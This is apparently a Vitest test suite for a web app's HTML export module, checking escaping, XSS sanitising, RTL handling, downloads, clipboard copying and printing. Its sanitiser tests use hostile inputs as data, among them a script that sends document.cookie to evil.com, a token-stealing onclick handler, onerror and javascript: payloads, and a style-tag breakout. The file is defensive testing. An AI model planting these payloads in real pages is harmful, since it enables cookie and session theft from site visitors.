import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  escapeHtml,
  detectRemoteAssets,
  exportStandaloneHtml,
  downloadHtmlFile,
  copyToClipboard,
  printDocument,
} from './exportDocument';

describe('exportDocument domain logic', () => {
  describe('escapeHtml', () => {
    it('escapes dangerous HTML special characters', () => {
      const malicious = '<script>alert("XSS" & \'test\')</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).toBe(
        '&lt;script&gt;alert(&quot;XSS&quot; &amp; &#039;test&#039;)&lt;/script&gt;'
      );
    });

    it('returns empty string for non-string or falsy input', () => {
      expect(escapeHtml('')).toBe('');
      // @ts-expect-error test invalid input
      expect(escapeHtml(null)).toBe('');
    });
  });

  describe('detectRemoteAssets', () => {
    it('detects http, https, and protocol-relative image sources', () => {
      const html = `
        <div class="hero">
          <img src="https://images.unsplash.com/photo-123.jpg" alt="Hero">
          <img src="http://example.com/icon.png" alt="Icon">
          <img src="//cdn.example.org/asset.svg" alt="CDN">
          <img src="/local-asset.png" alt="Local">
          <img src="data:image/png;base64,iVBORw0KGgo=" alt="Data">
        </div>
      `;

      const remoteAssets = detectRemoteAssets(html);
      expect(remoteAssets).toHaveLength(3);
      expect(remoteAssets).toContain('https://images.unsplash.com/photo-123.jpg');
      expect(remoteAssets).toContain('http://example.com/icon.png');
      expect(remoteAssets).toContain('//cdn.example.org/asset.svg');
      expect(remoteAssets).not.toContain('/local-asset.png');
    });

    it('returns empty array when no remote URLs are present', () => {
      const html = '<div class="card"><p>Plain text</p><img src="/logo.png"></div>';
      expect(detectRemoteAssets(html)).toEqual([]);
      expect(detectRemoteAssets('')).toEqual([]);
    });
  });

  describe('exportStandaloneHtml (T-0501, AC-EXPORT-001..006)', () => {
    it('generates valid HTML5 document structure with doctype, meta, title, style, and body', () => {
      const html = exportStandaloneHtml({
        title: 'My Landing Page',
        lang: 'fr',
        bodyHtml: '<section class="intro"><h1>Hello World</h1></section>',
        css: '.intro { padding: 20px; }',
      });

      expect(html).toContain('<!doctype html>');
      expect(html).toContain('<html lang="fr">');
      expect(html).toContain('<meta charset="utf-8">');
      expect(html).toContain('<meta name="viewport" content="width=device-width, initial-scale=1">');
      expect(html).toContain('<title>My Landing Page</title>');
      expect(html).toContain('<style>');
      expect(html).toContain('.intro { padding: 20px; }');
      expect(html).toContain('</style>');
      expect(html).toContain('<body>');
      expect(html).toContain('<section class="intro"><h1>Hello World</h1></section>');
      expect(html).toContain('</body>');
      expect(html).toContain('</html>');
    });

    it('safely escapes title and custom metadata to prevent XSS (AC-EXPORT-005)', () => {
      const html = exportStandaloneHtml({
        title: 'Title</title><script>alert("pwned")</script>',
        bodyHtml: '<p>Content</p>',
        css: '',
        meta: [
          { name: 'description', content: 'Safe "quote" & description' },
          { property: 'og:title', content: '<script>evil()</script>' },
        ],
      });

      expect(html).not.toContain('<script>alert("pwned")</script>');
      expect(html).toContain('&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;');
      expect(html).toContain('<meta name="description" content="Safe &quot;quote&quot; &amp; description">');
      expect(html).toContain('<meta property="og:title" content="&lt;script&gt;evil()&lt;/script&gt;">');
    });

    it('strips injected script tags and event handlers from exported body (AC-EXPORT-005)', () => {
      const dirtyBody = `
        <div onclick="stealTokens()">
          <h2>Section</h2>
          <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
          <img src="valid.png" onerror="alert(1)">
        </div>
      `;

      const html = exportStandaloneHtml({
        bodyHtml: dirtyBody,
        css: 'h2 { color: red; }',
      });

      expect(html).not.toContain('<script>');
      expect(html).not.toContain('stealTokens()');
      expect(html).not.toContain('onerror=');
      expect(html).toContain('<h2>Section</h2>');
      expect(html).toContain('<img src="valid.png">');
    });

    it('prevents javascript: URLs from being emitted (AC-EXPORT-006)', () => {
      const bodyWithJsUrl = '<a href="javascript:alert(1)">Click Me</a>';
      const html = exportStandaloneHtml({
        bodyHtml: bodyWithJsUrl,
        css: '',
      });

      expect(html).not.toContain('javascript:alert(1)');
      expect(html).toContain('Click Me');
    });

    it('prevents closing </style> tags from breaking style blocks', () => {
      const dangerousCss = 'body { color: red; } </style><script>alert("css")</script>';
      const html = exportStandaloneHtml({
        bodyHtml: '<p>Safe</p>',
        css: dangerousCss,
      });

      expect(html).not.toContain('</style><script>');
    });

    it('renders external stylesheets when provided', () => {
      const html = exportStandaloneHtml({
        bodyHtml: '<p>Test</p>',
        css: '',
        externalStylesheets: ['https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap'],
      });

      expect(html).toContain(
        '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap">'
      );
    });

    it('generates HTML with dir="rtl" for Arabic or RTL documents', () => {
      const html = exportStandaloneHtml({
        title: 'صفحة عربية',
        lang: 'ar',
        dir: 'rtl',
        bodyHtml: '<section><h1>مرحباً بكم</h1></section>',
        css: 'h1 { color: #0284c7; }',
      });

      expect(html).toContain('<html lang="ar" dir="rtl">');
      expect(html).toContain('مرحباً بكم');
    });

    it('automatically generates dir="rtl" and lang="ar" when Arabic content is present', () => {
      const html = exportStandaloneHtml({
        title: 'صفحة منتج',
        bodyHtml: '<div><h1>عرض خاص</h1></div>',
        css: '',
      });

      expect(html).toContain('<html lang="ar" dir="rtl">');
      expect(html).toContain('عرض خاص');
    });
  });

  describe('downloadHtmlFile (T-0504, AC-EXPORT-001)', () => {
    beforeEach(() => {
      vi.useFakeTimers();
    });

    afterEach(() => {
      vi.useRealTimers();
      vi.restoreAllMocks();
    });

    it('creates an anchor, appends to DOM, clicks it, and revokes object URL', () => {
      const mockCreateObjectURL = vi.fn().mockReturnValue('blob:http://localhost/test-uuid');
      const mockRevokeObjectURL = vi.fn();
      globalThis.URL.createObjectURL = mockCreateObjectURL;
      globalThis.URL.revokeObjectURL = mockRevokeObjectURL;

      const appendChildSpy = vi.spyOn(document.body, 'appendChild');
      const removeChildSpy = vi.spyOn(document.body, 'removeChild');

      downloadHtmlFile('<!doctype html><html></html>', 'my-portfolio');

      expect(mockCreateObjectURL).toHaveBeenCalledTimes(1);
      expect(appendChildSpy).toHaveBeenCalled();

      // Find the anchor element created
      const firstCall = appendChildSpy.mock.calls[0];
      expect(firstCall).toBeDefined();
      const anchor = firstCall![0] as HTMLAnchorElement;
      expect(anchor.tagName.toLowerCase()).toBe('a');
      expect(anchor.download).toBe('my-portfolio.html');
      expect(anchor.href).toBe('blob:http://localhost/test-uuid');

      // Fast-forward timeout
      vi.advanceTimersByTime(1000);
      expect(removeChildSpy).toHaveBeenCalledWith(anchor);
      expect(mockRevokeObjectURL).toHaveBeenCalledWith('blob:http://localhost/test-uuid');
    });
  });

  describe('copyToClipboard (T-0505, T-0506, AC-EXPORT-007, AC-EXPORT-008)', () => {
    afterEach(() => {
      vi.restoreAllMocks();
    });

    it('uses navigator.clipboard.writeText when available', async () => {
      const writeTextMock = vi.fn().mockResolvedValue(undefined);
      Object.assign(navigator, {
        clipboard: {
          writeText: writeTextMock,
        },
      });

      const result = await copyToClipboard('<p>Hello</p>');
      expect(result).toBe(true);
      expect(writeTextMock).toHaveBeenCalledWith('<p>Hello</p>');
    });

    it('falls back to document.execCommand when navigator.clipboard is unavailable', async () => {
      // @ts-expect-error remove clipboard to trigger fallback
      delete navigator.clipboard;

      document.execCommand = vi.fn().mockReturnValue(true);
      const appendChildSpy = vi.spyOn(document.body, 'appendChild');
      const removeChildSpy = vi.spyOn(document.body, 'removeChild');

      const result = await copyToClipboard('.btn { color: blue; }');

      expect(result).toBe(true);
      expect(appendChildSpy).toHaveBeenCalled();
      expect(document.execCommand).toHaveBeenCalledWith('copy');
      expect(removeChildSpy).toHaveBeenCalled();
    });
  });

  describe('printDocument', () => {
    it('creates an iframe, writes the standalone HTML with print styles, and calls print', () => {
      vi.useFakeTimers();
      const appendChildSpy = vi.spyOn(document.body, 'appendChild');

      printDocument({
        title: 'Printable Test',
        bodyHtml: '<h1>Print Test</h1>',
        css: 'h1 { color: red; }',
      });

      expect(appendChildSpy).toHaveBeenCalled();
      vi.useRealTimers();
    });
  });
});
